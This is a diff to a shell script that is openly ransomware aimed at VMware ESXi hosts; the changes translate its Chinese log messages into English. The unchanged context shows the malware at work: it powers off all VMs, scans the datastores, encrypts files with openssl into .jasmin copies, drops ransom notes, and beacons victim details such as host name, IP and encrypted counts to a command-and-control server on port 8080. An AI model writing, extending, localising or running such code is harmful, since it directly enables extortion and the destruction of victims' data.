@@ -69,12 +69,12 @@ is_target(){
 # 停止所有VM (确保VMDK不被锁定)
 # ────────────────────────────────────────
 stop_vms(){
-    log "停止所有VM..."
+    log "Stopping all VMs..."
     if has_cmd vim-cmd; then
         vim-cmd vmsvc/getallvms 2>/dev/null | awk 'NR>1{print $1}' | while read vmid; do
             [ -n "$vmid" ] || continue
             vim-cmd vmsvc/power.off "$vmid" 2>/dev/null
-            log "  已停止 vmid=$vmid"
+            log "  stopped vmid=$vmid"
         done
     fi
     if has_cmd esxcli; then
@@ -102,11 +102,11 @@ FAILS_FILE=/tmp/.jfails_$$
 note_fail(){ printf '%s\n' "$1" >> "$FAILS_FILE" 2>/dev/null; }
 report_fails(){
     [ -s "$FAILS_FILE" ] || return 0
-    log "!!! 有文件加密失败，原因统计:"
+    log "!!! Some files failed to encrypt. Reason breakdown:"
     sort "$FAILS_FILE" 2>/dev/null | uniq -c | sort -rn | while read -r C R; do
-        log "!!!   $C 次 — $R"
+        log "!!!   $C time(s) - $R"
     done
-    log "!!! 自查: 可用空间(df -h)、数据存储是否只读、目录可写性"
+    log "!!! Check: free space (df -h), whether the datastore is read-only, directory writability"
     rm -f "$FAILS_FILE"
 }
 
@@ -122,8 +122,8 @@ preflight(){
     [ -n "$AVAIL_KB" ] || return 0
     NEED_KB=$((NEED/1024))
     if [ "$AVAIL_KB" -lt $((NEED_KB + NEED_KB/20 + 1024)) ]; then
-        log "!!! 空间预检警告: $DS 可用 $((AVAIL_KB/1024/1024))GB < 需要约 $((NEED_KB/1024/1024))GB"
-        log "!!! 加密需为每个文件额外生成等大的 .jasmin，空间不足会大面积失败"
+        log "!!! Preflight warning: $DS has $((AVAIL_KB/1024/1024))GB free < ~$((NEED_KB/1024/1024))GB required"
+        log "!!! Each file needs an equally sized .jasmin copy; insufficient space causes widespread failures"
     fi
 }
 
@@ -249,7 +249,7 @@ drop_notes(){
             fi
         done < "$ND.uniq"
         rm -f "$ND.uniq"
-        log "勒索信已投放到 $WROTE 个目录"
+        log "Ransom note dropped in $WROTE directory(ies)"
     fi
     printf '%s\n' "$NOTE" > /tmp/READ_ME_DECRYPT.txt 2>/dev/null
     if has_cmd esxcli; then
@@ -272,8 +272,8 @@ beacon(){
     TIME_STR=$(date '+%H:%M:%S' 2>/dev/null)
     DATA="handshake=${SECRET}&machine_name=${HOSTNAME}&computer_user=root&os=ESXi%20${OS_VER}&date=${DATE}&time=${TIME_STR}&ip=${IP}&location=&systemid=${SID}&password=RSA_PROTECTED&encrypted_count=${COUNT}&encrypted_size=${SIZE}&encrypted_types=${TYPES}&encrypted_detail=${DETAIL}&is_complete=${DONE}&total_count=${TC}&total_size=${TS}"
     if ! http_post "$C2" "$DATA"; then
-        log "!!! 上报失败: $C2"
-        log "!!! 请检查回连地址是否可达、端口(本服务在 :8080)、握手密钥 SECRET 是否与后台一致"
+        log "!!! Beacon failed: $C2"
+        log "!!! Check that the C2 URL is reachable, the port (this service listens on :8080), and that SECRET matches the panel"
     fi
 }
 
@@ -281,7 +281,7 @@ beacon(){
 # 主流程
 # ────────────────────────────────────────
 main(){
-    has_cmd openssl || { log "缺少openssl，无法运行"; exit 1; }
+    has_cmd openssl || { log "openssl is missing, cannot run"; exit 1; }
 
     SID="$(hostname)_$$_$(date +%s)"
 
@@ -290,7 +290,7 @@ main(){
     PUBKEY=$(write_pubkey)
 
     # ── 阶段1: 预扫描统计目标文件总数（进度条分母） ──
-    log "正在扫描目标文件..."
+    log "Scanning for target files..."
     TOTAL=0
     TOTAL_BYTES=0
     for DS in /vmfs/volumes/*; do
@@ -307,8 +307,8 @@ main(){
         done < "$CL"
         rm -f "$CL"
     done
-    log "发现 $TOTAL 个目标文件，合计 $(fmt_bytes "$TOTAL_BYTES")"
-    [ "$TOTAL" -gt 0 ] || log "提示: 未发现匹配的目标文件(检查 EXTS 白名单)"
+    log "Found $TOTAL target file(s), $(fmt_bytes "$TOTAL_BYTES") total"
+    [ "$TOTAL" -gt 0 ] || log "Note: no matching target files found (check the EXTS whitelist)"
 
     preflight "$TOTAL_BYTES"    # 空间预检
 
@@ -360,7 +360,7 @@ main(){
 
     rm -f "$PUBKEY"
 
-    log "加密完成: $COUNT/$TOTAL 个文件, $(fmt_bytes "$SIZE") / $(fmt_bytes "$TOTAL_BYTES")"
+    log "Encryption complete: $COUNT/$TOTAL file(s), $(fmt_bytes "$SIZE") / $(fmt_bytes "$TOTAL_BYTES")"
     report_fails    # 失败必须可见，否则无从定位
 
     drop_notes "$SID" "$NOTE_DIRS"
